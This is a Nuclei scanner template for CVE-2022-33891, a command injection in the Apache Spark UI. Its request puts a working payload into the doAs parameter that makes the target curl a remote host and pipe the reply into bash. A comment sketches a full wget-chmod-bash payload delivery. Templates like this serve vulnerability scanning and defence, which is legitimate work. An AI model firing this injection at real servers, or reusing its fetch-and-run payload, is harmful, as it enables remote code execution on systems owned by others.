id: Check_CVE-2022-33891

info:
  name: Apache Spark Shell Command Injection Vulnerability
  author: 51pwnd
  severity: critical
  description: |
    The Apache Spark UI offers the possibility to enable ACLs via the configuration option spark.acls.enable. With an authentication filter, this checks whether a user has access permissions to view or modify the application. If ACLs are enabled, a code path in HttpSecurityFilter can allow someone to perform impersonation by providing an arbitrary user name. A malicious user might then be able to reach a permission check function that will ultimately build a Unix shell command based on their input, and execute it. This will result in arbitrary shell command execution as the user Spark is currently running as. This affects Apache Spark versions 3.0.3 and earlier, versions 3.1.1 to 3.1.2, and versions 3.2.0 to 3.2.1.
  reference:
    - https://github.com/hktalent/nuclei-templates
    - https://51pwn.com
  
  tags: apache,spark

#  /?doAs=`wget ' + yourHost + '/' + yourPayload + ' && chmod 755 ' + yourPayload + ' | bash
requests:
  - raw:
      - |+
        GET /?doAs=`curl%20http://{{interactsh-url}}/x | bash` HTTP/1.1
        Host: {{Host}}
        Accept: */*
        Connection: close

    matchers-condition: and
    unsafe: true
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the DNS Interaction
        words:
          - "dns"

      # - type: regex
      #   part: interactsh_request
      #   regex:
      #     - '(uid.*)' # Match for extracted ${hostName} variable

    extractors:
      - type: regex
        part: interactsh_request
        group: 2
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' 

# Enhanced by mp on 2022/05/27
